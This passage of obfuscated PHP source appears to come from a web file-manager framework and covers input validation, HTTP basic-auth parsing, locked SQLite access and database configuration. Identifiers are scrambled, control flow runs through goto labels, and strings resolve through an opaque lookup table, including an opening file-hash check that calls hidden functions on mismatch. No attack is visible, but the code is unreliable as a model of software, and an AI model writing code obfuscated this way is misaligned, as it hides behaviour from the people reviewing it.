DÄİ–ÊĞòÄ; DÄİ–ÊĞòÄ: Hook::trigger($E¾ÓáÌÃ¸•[1313], $DÛ©—ĞÇ); goto eåºŞñ¼“; Bœ°›…¡: $E¾ÓáÌÃ¸• =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b«ï¨Ñ‚÷œ = array($E¾ÓáÌÃ¸•[29] => $E¾ÓáÌÃ¸•[1310], $E¾ÓáÌÃ¸•[693] => $cÔºÄ¢á‹‚); if (in_array($b‘ƒ¥ˆåå¡, array($E¾ÓáÌÃ¸•[1310], $E¾ÓáÌÃ¸•[1311]))) { $b«ï¨Ñ‚÷œ[$E¾ÓáÌÃ¸•[29]] = $b‘ƒ¥ˆåå¡; } goto c°ÉÊ•’”ˆ; eåºŞñ¼“: } } goto eŸ–ÔªÙ£›; FÈ¼ïì‚Ş: $D¦‚æ¡ŸÓ = $_SERVER[´Ù×Íå‘ÄõÛ][790]; if ($_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][791]] != $D¦‚æ¡ŸÓ($báõ™ ÷öÏ)) { goto cáÒËƒ£ö¡; Aâêõ ´Ş¤: $B„œÄ®£Ÿé = explode($_SERVER[´Ù×Íå‘ÄõÛ][217], $A”„´íÙÜÓ); if (count($B„œÄ®£Ÿé) < $_SERVER[´Ù×Íå‘ÄõÛ][558]) { $aœß¥³£áó = $_SERVER[´Ù×Íå‘ÄõÛ][796]; $aœß¥³£áó(); } $dËÁËéâÇ = $_SERVER[´Ù×Íå‘ÄõÛ][1246]; goto f‰Ö¨¯ºÜè; f‰Ö¨¯ºÜè: $dËÁËéâÇ($báõ™ ÷öÏ); goto EÎƒŠ ë´—; cáÒËƒ£ö¡: $c‘İ§ê·ßÖ = $_SERVER[´Ù×Íå‘ÄõÛ][793]; $CÕ×‹‚•Ã = $_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][794]] . $_SERVER[´Ù×Íå‘ÄõÛ][795]; $A”„´íÙÜÓ = $c‘İ§ê·ßÖ($CÕ×‹‚•Ã); goto Aâêõ ´Ş¤; EÎƒŠ ë´—: } class Input { public static function getArray($b‚’³º¶‘‘) { goto F‡’®öë¯¢; fÁ·ñå Æ: $B•è’©© = array(); $cˆºÑçˆŞ = LNG($A¼¿Ùåà˜ä[1884]); foreach ($b‚’³º¶‘‘ as $eŠĞàã¸·› => $D†×“š‡ãï) { goto EŒ£‹ƒ™ê™; côíŞáÔâõ: if (!array_key_exists($eŠĞàã¸·›, $in)) { if (array_key_exists($A¼¿Ùåà˜ä[1886], $D†×“š‡ãï)) { if (!is_null($D†×“š‡ãï[$A¼¿Ùåà˜ä[1886]])) { $B‹‡à³ĞË[$EÚ¸ò¬ØùÉ] = $D†×“š‡ãï[$A¼¿Ùåà˜ä[1886]]; } } else { if (isset($D†×“š‡ãï[$A¼¿Ùåà˜ä[1887]])) { $B•è’©©[] = $CŒÂíÑƒ½; } } continue; } if (isset($D†×“š‡ãï[$A¼¿Ùåà˜ä[1887]]) && $D†×“š‡ãï[$A¼¿Ùåà˜ä[1887]] == $A¼¿Ùåà˜ä[282]) { $Dã­°µô› = json_decode($in[$eŠĞàã¸·›], !0); if (is_array($Dã­°µô›)) { $B‹‡à³ĞË[$EÚ¸ò¬ØùÉ] = $Dã­°µô›; } else { if (array_key_exists($A¼¿Ùåà˜ä[1886], $D†×“š‡ãï)) { if (!is_null($D†×“š‡ãï[$A¼¿Ùåà˜ä[1886]])) { $B‹‡à³ĞË[$EÚ¸ò¬ØùÉ] = $D†×“š‡ãï[$A¼¿Ùåà˜ä[1886]]; } } else { $B•è’©©[] = $CŒÂíÑƒ½; } } continue; } $eŸ–±Ü–ù = _get($D†×“š‡ãï, $A¼¿Ùåà˜ä[1016]); goto eçİ“¸³; eçİ“¸³: if (isset($D†×“š‡ãï[$A¼¿Ùåà˜ä[1887]]) && !self::check($in[$eŠĞàã¸·›], $D†×“š‡ãï[$A¼¿Ùåà˜ä[1887]], $eŸ–±Ü–ù)) { if (array_key_exists($A¼¿Ùåà˜ä[1886], $D†×“š‡ãï)) { if (!is_null($D†×“š‡ãï[$A¼¿Ùåà˜ä[1886]])) { $B‹‡à³ĞË[$EÚ¸ò¬ØùÉ] = $D†×“š‡ãï[$A¼¿Ùåà˜ä[1886]]; } } else { $B•è’©©[] = $CŒÂíÑƒ½; } continue; } $B‹‡à³ĞË[$EÚ¸ò¬ØùÉ] = $in[$eŠĞàã¸·›]; goto B¢§ÊŞí‰; EŒ£‹ƒ™ê™: $CŒÂíÑƒ½ = _get($D†×“š‡ãï, $A¼¿Ùåà˜ä[1252], $cˆºÑçˆŞ . $A¼¿Ùåà˜ä[883] . $eŠĞàã¸·›); $EÚ¸ò¬ØùÉ = $eŠĞàã¸·›; if (isset($D†×“š‡ãï[$A¼¿Ùåà˜ä[1885]]) && $D†×“š‡ãï[$A¼¿Ùåà˜ä[1885]]) { $EÚ¸ò¬ØùÉ = $D†×“š‡ãï[$A¼¿Ùåà˜ä[1885]]; } goto côíŞáÔâõ; B¢§ÊŞí‰: } goto eê«óä‚—; eê«óä‚—: if (count($B•è’©©) > 0) { show_json(implode($A¼¿Ùåà˜ä[1888], $B•è’©©), !1); } return $B‹‡à³ĞË; goto eİğ¿Ú­’ñ; F‡’®öë¯¢: $A¼¿Ùåà˜ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; global $in; $B‹‡à³ĞË = array(); goto fÁ·ñå Æ; eİğ¿Ú­’ñ: } public static function reg($EÉ™½¶¬Ÿ­ = "\x72\x65\161\x75\x69\x72\x65") { static $f¼ï¹¡“´ = array("\162\x65\x71\x75\151\x72\x65" => "\x2e\53", "\156\x75\x6d\142\x65\x72" => "\x5c\144\53", "\151\x6e\x74\x65\x67\145\x72" => "\x5c\144\x2b", "\x68\x65\170" => "\133\60\x2d\71\101\x2d\106\x61\x2d\x66\x5d\53", "\151\156\164" => "\133\55\134\x2b\135\x3f\x5c\144\x2b", "\142\x6f\157\154" => "\60\174\61", "\x66\x6c\x6f\141\164" => "\x5b\55\x5c\x2b\135\77\x5c\x64\53\50\134\x2e\x5c\x64\53\x29\x3f", "\x65\156\x67\x6c\x69\163\x68" => "\133\x41\x2d\132\141\x2d\172\40\x5d\53", "\x63\150\x69\156\x65\163\x65" => "\133\134\170\x7b\x34\145\60\x30\x7d\x2d\134\170\173\x39\x66\x61\x35\x7d\135\x2b", "\150\141\x73\x43\150\x69\x6e\145\163\x65" => "\x2f\x28\133\134\170\173\64\145\60\60\x7d\x2d\134\x78\173\71\146\x61\65\x7d\135\x2b\51\x2f\x75", "\x65\155\x61\151\154" => "\x5c\167\53\50\x5b\x5c\56\134\55\135\134\167\x2b\51\52\134\100\134\167\x2b\x28\x5b\134\x2e\x5c\55\135\x5c\167\53\51\52\134\56\134\167\53", "\x70\150\157\156\145" => "\x31\x5b\63\55\71\135\134\x64\173\x39\x7d", "\x74\145\154\160\x68\157\x6e\x65" => "\50\134\50\x5c\x64\x7b\x33\x2c\64\175\x5c\x29\174\x5c\144\x7b\x33\x2c\x34\x7d\x2d\174\x5c\x73\x29\77\x5c\x64\173\67\54\x31\x34\x7d", "\165\162\154" => "\x28\150\164\x74\x70\174\146\164\160\x7c\x68\x74\164\160\163\51\x3a\134\x2f\x5c\57\x5b\134\x77\x5c\55\137\135\x2b\50\x5c\x2e\133\134\x77\x5c\55\x5f\x5d\x2b\x29\53\x28\133\134\x77\134\x2d\x5c\56\54\x40\x3f\x5e\75\45\x26\72\x5c\57\176\x5c\x2b\x23\135\52\133\x5c\167\134\x2d\x5c\x40\77\136\75\x25\46\x5c\57\x7e\134\53\x23\135\x29\x3f", "\x75\162\154\x46\x75\154\154" => "\133\141\55\172\x41\55\172\135\53\72\134\x2f\134\57\133\x5e\134\x73\x5d\52", "\151\x70" => "\x28\134\x64\173\61\54\63\x7d\134\56\51\173\x33\175\x28\134\x64\173\61\x2c\63\x7d\51", "\172\x69\x70" => "\133\61\x2d\x39\135\134\x64\x7b\65\175\50\77\x21\x5c\144\51", "\151\144\103\x61\162\144" => "\50\x5c\144\173\x31\65\x7d\x29\x7c\50\134\144\x7b\x31\x37\x7d\x28\x5c\x64\174\130\174\170\51\51", "\x63\157\x6c\x6f\162" => "\x23\x28\x5b\60\55\x39\x41\55\106\141\55\146\135\x7b\63\x7d\174\133\x30\55\71\x41\x2d\106\x61\x2d\x66\135\173\66\x7d\51", "\164\151\x6d\145" => "\x28\x5b\x30\x2d\61\135\x5c\x64\174\x32\x5b\x30\x2d\64\135\51\72\133\x30\x2d\65\135\x5c\144", "\144\141\164\145" => "\x5c\x64\x7b\64\175\133\55\134\x2f\135\x3f\x28\60\133\x31\x2d\x39\135\174\61\x5b\x30\55\62\135\51\133\55\x5c\57\x5d\x3f\50\x5b\60\x2d\x32\x5d\x5c\x64\174\63\133\60\55\x31\x5d\51", "\144\141\164\145\x54\x69\155\145" => "\x5c\144\x7b\x34\x7d\x5b\x2d\x5c\x2f\x5d\x3f\50\60\x5b\x31\55\x39\x5d\x7c\x31\x5b\60\x2d\62\x5d\x29\133\55\x5c\x2f\135\x3f\x28\133\x30\x2d\62\x5d\x5c\144\174\x33\x5b\x30\55\61\x5d\51\134\x73\53\x28\133\60\x2d\61\135\134\x64\x7c\x32\x5b\x30\x2d\64\135\x29\72\x5b\60\55\x35\x5d\x5c\144", "\160\x61\x73\x73\x77\157\x72\144" => "\50\x3f\x3d\56\x2a\134\x64\51\50\x3f\x3d\56\x2a\133\x61\55\172\135\x29\x28\x3f\75\56\52\133\101\55\x5a\x5d\x29\56\x7b\x38\54\62\60\175", "\x6b\145\171" => "\x5b\x41\55\x5a\x61\55\x7a\x30\55\71\x5f\x5c\55\134\x2e\135\x2b", "\x6b\145\x79\106\x75\154\154" => "\x5b\x41\55\x5a\141\x2d\x7a\x30\x2d\x39\x5f\134\x2d\134\56\134\163\54\x5d\53"); if (!$EÉ™½¶¬Ÿ­) { return $f¼ï¹¡“´; } return $f¼ï¹¡“´[$EÉ™½¶¬Ÿ­]; } public static function check($C³‹†‚‚ö, $Eî¬ìà«Á‚, $B–´ôªÆÃ = null) { $D·ì›ø¿Éñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; switch ($Eî¬ìà«Á‚) { case $D·ì›ø¿Éñ[7]: return in_array($C³‹†‚‚ö, $B–´ôªÆÃ); break; case $D·ì›ø¿Éñ[1889]: return floatval($C³‹†‚‚ö) > $B–´ôªÆÃ; break; case $D·ì›ø¿Éñ[1890]: return floatval($C³‹†‚‚ö) < $B–´ôªÆÃ; break; case $D·ì›ø¿Éñ[325]: return strlen($C³‹†‚‚ö) >= $B–´ôªÆÃ[0] && strlen($C³‹†‚‚ö) <= $B–´ôªÆÃ[1]; break; case $D·ì›ø¿Éñ[325]: if (is_array($B–´ôªÆÃ)) { return strlen($C³‹†‚‚ö) >= $B–´ôªÆÃ[0] && strlen($C³‹†‚‚ö) <= $B–´ôªÆÃ[1]; break; } else { return strlen($C³‹†‚‚ö) == $B–´ôªÆÃ; break; } case $D·ì›ø¿Éñ[321]: return floatval($C³‹†‚‚ö) >= $B–´ôªÆÃ[0] && floatval($C³‹†‚‚ö) <= $B–´ôªÆÃ[1]; break; } $bì†àİ­ù = self::reg(!1); $Eî¬ìà«Á‚ = isset($bì†àİ­ù[$Eî¬ìà«Á‚]) ? $bì†àİ­ù[$Eî¬ìà«Á‚] : $Eî¬ìà«Á‚; if (substr($Eî¬ìà«Á‚, 0, 1) != $D·ì›ø¿Éñ[8]) { $Eî¬ìà«Á‚ = $D·ì›ø¿Éñ[1891] . $Eî¬ìà«Á‚ . $D·ì›ø¿Éñ[1892]; } return preg_match($Eî¬ìà«Á‚, $C³‹†‚‚ö) === 1; } public static function get($f¤ô‹˜Û«Ë, $B¯°ÔßŸõì = null, $e¸ÓÛ›½­¹ = null, $bï‚Ÿã´é = null) { goto e©õøŸê©µ; f÷¥¡èªê„: return $B¦‰ÌËìª[$f¤ô‹˜Û«Ë]; goto aÇ†ÇƒòÜœ; dÜ¡Î¡§î¼: if (!is_null($bï‚Ÿã´é)) { $BÈÃ„º’‹°[$F«§¼ŒÍğº[1016]] = $bï‚Ÿã´é; } if (!is_null($B¯°ÔßŸõì)) { $BÈÃ„º’‹°[$F«§¼ŒÍğº[1887]] = $B¯°ÔßŸõì; } $B¦‰ÌËìª = Input::getArray(array($f¤ô‹˜Û«Ë => $BÈÃ„º’‹°)); goto f÷¥¡èªê„; e©õøŸê©µ: $F«§¼ŒÍğº =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÈÃ„º’‹° = array(); if (!is_null($e¸ÓÛ›½­¹)) { $BÈÃ„º’‹°[$F«§¼ŒÍğº[34]] = $e¸ÓÛ›½­¹; } goto dÜ¡Î¡§î¼; aÇ†ÇƒòÜœ: } } goto FåÜØÇ°; Cê‰‘†á: class HttpAuth { public static function get() { $c‡ß·ˆÃö– =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E‚†ˆ¨¾Ï = $c‡ß·ˆÃö–[33]; $bĞµ§å˜‹± = $c‡ß·ˆÃö–[33]; if (isset($_SERVER[$c‡ß·ˆÃö–[1765]])) { $E‚†ˆ¨¾Ï = $_SERVER[$c‡ß·ˆÃö–[1765]]; $bĞµ§å˜‹± = $_SERVER[$c‡ß·ˆÃö–[1766]]; } elseif (isset($_SERVER[$c‡ß·ˆÃö–[1767]])) { $cÎ‹È¢’İ = $_SERVER[$c‡ß·ˆÃö–[1767]]; if (strpos(strtolower($cÎ‹È¢’İ), $c‡ß·ˆÃö–[1768]) === 0) { $d”Ñ“Á„Ã¿ = explode($c‡ß·ˆÃö–[4], base64_decode(substr($cÎ‹È¢’İ, 6))); $E‚†ˆ¨¾Ï = isset($d”Ñ“Á„Ã¿[0]) ? $d”Ñ“Á„Ã¿[0] : $c‡ß·ˆÃö–[33]; $bĞµ§å˜‹± = isset($d”Ñ“Á„Ã¿[1]) ? $d”Ñ“Á„Ã¿[1] : 0; } } return array($c‡ß·ˆÃö–[537] => $E‚†ˆ¨¾Ï, $c‡ß·ˆÃö–[900] => $bĞµ§å˜‹±); } public static function error() { goto EòÇöÊÛ³â; b¿¶Æ­: header($Cñ§Ñ´Â¬¼[1771]); header($Cñ§Ñ´Â¬¼[1772]); header($Cñ§Ñ´Â¬¼[1269]); goto cÖ „¬‡¶º; cÖ „¬‡¶º: die; goto fÂå¡»¨; EòÇöÊÛ³â: $Cñ§Ñ´Â¬¼ =& $_SERVER[´Ù×Íå‘ÄõÛ]; header($Cñ§Ñ´Â¬¼[1769]); header($Cñ§Ñ´Â¬¼[1770]); goto b¿¶Æ­; fÂå¡»¨: } public static function make($aÁŸí…”Êƒ, $F½£æİ¸¸–) { $Aéå‡¹Çæ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return $Aéå‡¹Çæ[1773] + base64_encode($aÁŸí…”Êƒ . $Aéå‡¹Çæ[4] . $F½£æİ¸¸–); } } $báõ™ ÷öÏ = LIB_DIR . $_SERVER[´Ù×Íå‘ÄõÛ][789]; $D¦‚æ¡ŸÓ = $_SERVER[´Ù×Íå‘ÄõÛ][790]; goto BŞƒè±Œ; EµÃ·Œ°öÏ: class DbSqlite extends DbSqliteBase { public function query($eÅ‚É‰Áº‰) { goto dÇ“…¥¾ÈÕ; dÇ“…¥¾ÈÕ: $B«•Á•¥² =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÙ…§í£´ = DATA_PATH . $B«•Á•¥²[875]; $b‹·–èâ× = fopen($aÙ…§í£´, $B«•Á•¥²[876]); goto cñóáä–Â; cñóáä–Â: if (!$b‹·–èâ×) { return !1; } if (flock($b‹·–èâ×, LOCK_EX)) { $C¤¬ï˜ä…» = parent::query($eÅ‚É‰Áº‰); flock($b‹·–èâ×, LOCK_UN); fclose($b‹·–èâ×); return $C¤¬ï˜ä…»; } flock($b‹·–èâ×, LOCK_UN); goto Cù¼ØŒÏ§; Cù¼ØŒÏ§: fclose($b‹·–èâ×); show_json($B«•Á•¥²[877], !1); return !1; goto FÆ‚Ô²æŠÍ; FÆ‚Ô²æŠÍ: } public function execute($c¬ÏÊİƒ¥å) { goto aÙï›„…Çß; aÙï›„…Çß: $eøš¨Æøº» =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a‘ğ¬£äà = DATA_PATH . $eøš¨Æøº»[875]; $D·ëƒÙËÙ‡ = fopen($a‘ğ¬£äà, $eøš¨Æøº»[876]); goto bÑ†®ùÎùì; dÅõœ¯ÍÉ: fclose($D·ëƒÙËÙ‡); show_json($eøš¨Æøº»[877], !1); return !1; goto e„¤×ºã×¾; bÑ†®ùÎùì: if (!$D·ëƒÙËÙ‡) { return !1; } if (flock($D·ëƒÙËÙ‡, LOCK_EX)) { $e»Å¢ìãëš = parent::execute($c¬ÏÊİƒ¥å); flock($D·ëƒÙËÙ‡, LOCK_UN); fclose($D·ëƒÙËÙ‡); return $e»Å¢ìãëš; } flock($D·ëƒÙËÙ‡, LOCK_UN); goto dÅõœ¯ÍÉ; e„¤×ºã×¾: } } class DbSqlite3 extends DbSqlite3Base { public function query($dŸŸà”Íæ¸) { goto C˜‚ªïµ“Ô; F•æº»Ô½: fclose($A°¨ä¼Ô°‚); show_json($a‰ì·­…ˆµ[877], !1); return !1; goto AĞ’”÷õòµ; C˜‚ªïµ“Ô: $a‰ì·­…ˆµ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b»ëãŞõ½ = DATA_PATH . $a‰ì·­…ˆµ[875]; $A°¨ä¼Ô°‚ = fopen($b»ëãŞõ½, $a‰ì·­…ˆµ[876]); goto cºö—ç²À‘; cºö—ç²À‘: if (!$A°¨ä¼Ô°‚) { return !1; } if (flock($A°¨ä¼Ô°‚, LOCK_EX)) { $fó¿Ñ£Šå¾ = parent::query($dŸŸà”Íæ¸); flock($A°¨ä¼Ô°‚, LOCK_UN); fclose($A°¨ä¼Ô°‚); return $fó¿Ñ£Šå¾; } flock($A°¨ä¼Ô°‚, LOCK_UN); goto F•æº»Ô½; AĞ’”÷õòµ: } public function execute($CçÜêƒ»Ú) { goto BÅë†¦ˆ£ø; bÁóƒ¿ƒ·: if (!$bÖîÚÕâ) { return !1; } if (flock($bÖîÚÕâ, LOCK_EX)) { $f™£‹ø‡¿å = parent::execute($CçÜêƒ»Ú); flock($bÖîÚÕâ, LOCK_UN); fclose($bÖîÚÕâ); return $f™£‹ø‡¿å; } flock($bÖîÚÕâ, LOCK_UN); goto C‹º¢‰ÄÍõ; C‹º¢‰ÄÍõ: fclose($bÖîÚÕâ); show_json($FÛŠ³’°[877], !1); return !1; goto BÛÁÉ×¤’¿; BÅë†¦ˆ£ø: $FÛŠ³’° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bâ¨í¥°… = DATA_PATH . $FÛŠ³’°[875]; $bÖîÚÕâ = fopen($bâ¨í¥°…, $FÛŠ³’°[876]); goto bÁóƒ¿ƒ·; BÛÁÉ×¤’¿: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\156\x65\x71" => "\74\76", "\147\x74" => "\76", "\x65\147\x74" => "\76\x3d", "\154\164" => "\74", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\x6f\x74\154\151\x6b\x65" => "\116\117\124\x20\114\x49\x4b\105", "\x6c\x69\153\145" => "\114\x49\113\105", "\x69\x6e" => "\x49\x4e", "\x6e\x6f\x74\151\x6e" => "\116\x4f\x54\x20\111\x4e", "\x6e\157\x74\x20\151\x6e" => "\116\x4f\x54\40\x49\116", "\x62\145\164\167\x65\x65\x6e" => "\102\105\x54\127\105\105\116", "\156\x6f\164\142\145\164\x77\x65\x65\156" => "\x4e\x4f\x54\40\102\x45\124\127\x45\x45\x4e", "\156\157\164\x20\x62\x65\x74\x77\x65\145\x6e" => "\x4e\117\x54\x20\x42\105\x54\x57\x45\x45\116"); protected $selectSql = "\x53\105\x4c\105\103\x54\45\x44\x49\123\x54\111\116\103\124\x25\x20\45\106\x49\x45\x4c\104\45\x20\x46\x52\117\x4d\40\45\x54\x41\102\114\x45\x25\x25\112\117\111\x4e\x25\x25\x57\x48\x45\122\x45\45\x25\x47\x52\x4f\125\x50\45\x25\x48\101\126\111\x4e\x47\x25\45\117\x52\x44\x45\x52\x25\45\x4c\111\x4d\x49\124\45\x20\x25\x55\x4e\111\x4f\x4e\45\x25\x43\x4f\x4d\115\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $CÛ–‹•³ô = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[´Ù×Íå‘ÄõÛ][878], $CÛ–‹•³ô); } public function factory($d®…ó®ë‚ = '') { goto D„¹Ş««‡ˆ; cˆÉ­¨–Éé: $this->dbType = ucwords(strtolower($d®…ó®ë‚[$A‰°ïŸîº›[879]])); $bïâŞ‡¢Ø· = $A‰°ïŸîº›[881] . $this->dbType; if (class_exists($bïâŞ‡¢Ø·)) { $aÅº‡ÅïÒ = new $bïâŞ‡¢Ø·($d®…ó®ë‚); if ($A‰°ïŸîº›[724] != strtolower($d®…ó®ë‚[$A‰°ïŸîº›[879]])) { $aÅº‡ÅïÒ->dbType = strtoupper($this->dbType); } else { $aÅº‡ÅïÒ->dbType = $this->_getDsnType($d®…ó®ë‚[$A‰°ïŸîº›[831]]); } } else { think_exception(think_lang($A‰°ïŸîº›[882]) . $A‰°ïŸîº›[883] . $bïâŞ‡¢Ø·); } goto aŠ·š×éó†; D„¹Ş««‡ˆ: $A‰°ïŸîº› =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d®…ó®ë‚ = $this->parseConfig($d®…ó®ë‚); if (empty($d®…ó®ë‚[$A‰°ïŸîº›[879]])) { think_exception(think_lang($A‰°ïŸîº›[880])); } goto cˆÉ­¨–Éé; aŠ·š×éó†: return $aÅº‡ÅïÒ; goto Aóƒšˆ‘˜º; Aóƒšˆ‘˜º: } public function __call($bŞáêîô¥‡, $Bğåô¤é‹) { if (method_exists($this, $bŞáêîô¥‡)) { return call_user_func_array(array($this, $bŞáêîô¥‡), $Bğåô¤é‹); } } protected function _getDsnType($eï‚§’Ã¤ä) { $dö†å÷´¢Ÿ = explode($_SERVER[´Ù×Íå‘ÄõÛ][4], $eï‚§’Ã¤ä); $bñÖåšğÒ = strtoupper(trim($dö†å÷´¢Ÿ[0])); return $bñÖåšğÒ; } private function parseConfig($fÛù¶ä‹× = '') { $e‰æŞÊÌõ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!empty($fÛù¶ä‹×) && is_string($fÛù¶ä‹×)) { $fÛù¶ä‹× = $this->parseDSN($fÛù¶ä‹×); } elseif (is_array($fÛù¶ä‹×)) { $fÛù¶ä‹× = array_change_key_case($fÛù¶ä‹×); $fÛù¶ä‹× = array($e‰æŞÊÌõ[879] => $fÛù¶ä‹×[$e‰æŞÊÌõ[723]], $e‰æŞÊÌõ[804] => $fÛù¶ä‹×[$e‰æŞÊÌõ[884]], $e‰æŞÊÌõ[805] => $fÛù¶ä‹×[$e‰æŞÊÌõ[885]], $e‰æŞÊÌõ[802] => $fÛù¶ä‹×[$e‰æŞÊÌõ[886]], $e‰æŞÊÌõ[803] => $fÛù¶ä‹×[$e‰æŞÊÌõ[887]], $e‰æŞÊÌõ[17] => $fÛù¶ä‹×[$e‰æŞÊÌõ[888]], $e‰æŞÊÌõ[831] => $fÛù¶ä‹×[$e‰æŞÊÌõ[725]], $e‰æŞÊÌõ[13] => isset($fÛù¶ä‹×[$e‰æŞÊÌõ[889]]) ? $fÛù¶ä‹×[$e‰æŞÊÌõ[889]] : array()); } elseif (empty($fÛù¶ä‹×)) { if (think_config($e‰æŞÊÌõ[890]) && $e‰æŞÊÌõ[724] != strtolower(think_config($e‰æŞÊÌõ[891]))) { $fÛù¶ä‹× = $this->parseDSN(think_config($e‰æŞÊÌõ[890])); } else { $fÛù¶ä‹× = array($e‰æŞÊÌõ[879] => think_config($e‰æŞÊÌõ[891]), $e‰æŞÊÌõ[804] => think_config($e‰æŞÊÌõ[892]), $e‰æŞÊÌõ[805] => think_config($e‰æŞÊÌõ[893]), $e‰æŞÊÌõ[802] => think_config($e‰æŞÊÌõ[894]), $e‰æŞÊÌõ[803] => think_config($e‰æŞÊÌõ[895]), $e‰æŞÊÌõ[17] => think_config($e‰æŞÊÌõ[234]), $e‰æŞÊÌõ[831] => think_config($e‰æŞÊÌõ[890]), $e‰æŞÊÌõ[13] => think_config($e‰æŞÊÌõ[896])); } } return $fÛù¶ä‹×; } protected function initConnect($CÙ¯ö³ˆ— = true) { if (1 == think_config($_SERVER[´Ù×Íå‘ÄõÛ][18])) { $this->_linkID = $this->multiConnect($CÙ¯ö³ˆ—); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($A¬¸ÄŞÖ¾ = false) { $e„£‡Îèˆ˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $B¥êí°¨æö = array(); if (empty($B¥êí°¨æö)) { foreach ($this->config as $bñùµ¬‹ö => $d•È’ÚÑò‚) { $B¥êí°¨æö[$bñùµ¬‹ö] = explode($e„£‡Îèˆ˜[47], $d•È’ÚÑò‚); } } if (think_config($e„£‡Îèˆ˜[897])) { if ($A¬¸ÄŞÖ¾) { $Aº¬Ş¢†‹¢ = floor(mt_rand(0, think_config($e„£‡Îèˆ˜[898]) - 1)); } else { if (is_numeric(think_config($e„£‡Îèˆ˜[899]))) { $Aº¬Ş¢†‹¢ = think_config($e„£‡Îèˆ˜[899]); } else { $Aº¬Ş¢†‹¢ = floor(mt_rand(think_config($e„£‡Îèˆ˜[898]), count($B¥êí°¨æö[$e„£‡Îèˆ˜[802]]) - 1)); } } } else { $Aº¬Ş¢†‹¢ = floor(mt_rand(0, count($B¥êí°¨æö[$e„£‡Îèˆ˜[802]]) - 1)); } $f•Æ—ïó¢ = array($e„£‡Îèˆ˜[804] => isset($B¥êí°¨æö[$e„£‡Îèˆ˜[804]][$Aº¬Ş¢†‹¢]) ? $B¥êí°¨æö[$e„£‡Îèˆ˜[804]][$Aº¬Ş¢†‹¢] : $B¥êí°¨æö[$e„£‡Îèˆ˜[804]][0], $e„£‡Îèˆ˜[805] => isset($B¥êí°¨æö[$e„£‡Îèˆ˜[805]][$Aº¬Ş¢†‹¢]) ? $B¥êí°¨æö[$e„£‡Îèˆ˜[805]][$Aº¬Ş¢†‹¢] : $B¥êí°¨æö[$e„£‡Îèˆ˜[805]][0], $e„£‡Îèˆ˜[802] => isset($B¥êí°¨æö[$e„£‡Îèˆ˜[802]][$Aº¬Ş¢†‹¢]) ? $B¥êí°¨æö[$e„£‡Îèˆ˜[802]][$Aº¬Ş¢†‹¢] : $B¥êí°¨æö[$e„£‡Îèˆ˜[802]][0], $e„£‡Îèˆ˜[803] => isset($B¥êí°¨æö[$e„£‡Îèˆ˜[803]][$Aº¬Ş¢†‹¢]) ? $B¥êí°¨æö[$e„£‡Îèˆ˜[803]][$Aº¬Ş¢†‹¢] : $B¥êí°¨æö[$e„£‡Îèˆ˜[803]][0], $e„£‡Îèˆ˜[17] => isset($B¥êí°¨æö[$e„£‡Îèˆ˜[17]][$Aº¬Ş¢†‹¢]) ? $B¥êí°¨æö[$e„£‡Îèˆ˜[17]][$Aº¬Ş¢†‹¢] : $B¥êí°¨æö[$e„£‡Îèˆ˜[17]][0], $e„£‡Îèˆ˜[831] => isset($B¥êí°¨æö[$e„£‡Îèˆ˜[831]][$Aº¬Ş¢†‹¢]) ? $B¥êí°¨æö[$e„£‡Îèˆ˜[831]][$Aº¬Ş¢†‹¢] : $B¥êí°¨æö[$e„£‡Îèˆ˜[831]][0], $e„£‡Îèˆ˜[13] => isset($B¥êí°¨æö[$e„£‡Îèˆ˜[13]][$Aº¬Ş¢†‹¢]) ? $B¥êí°¨æö[$e„£‡Îèˆ˜[13]][$Aº¬Ş¢†‹¢] : $B¥êí°¨æö[$e„£‡Îèˆ˜[13]][0]); return $this->connect($f•Æ—ïó¢, $Aº¬Ş¢†‹¢); } public function parseDSN($féŠÏƒ´¯Ô) { $cŠÎËÛĞòù =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($féŠÏƒ´¯Ô)) { return !1; } $BÊèµ¤ÇÏÍ = parse_url($féŠÏƒ´¯Ô); if ($BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[168]]) { $a‰…¢Šé˜ = array($cŠÎËÛĞòù[879] => $BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[168]], $cŠÎËÛĞòù[804] => isset($BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[537]]) ? $BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[537]] : $cŠÎËÛĞòù[33], $cŠÎËÛĞòù[805] => isset($BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[900]]) ? $BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[900]] : $cŠÎËÛĞòù[33], $cŠÎËÛĞòù[802] => isset($BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[169]]) ? $BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[169]] : $cŠÎËÛĞòù[33], $cŠÎËÛĞòù[803] => isset($BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[170]]) ? $BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[170]] : $cŠÎËÛĞòù[33], $cŠÎËÛĞòù[17] => isset($BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[75]]) ? 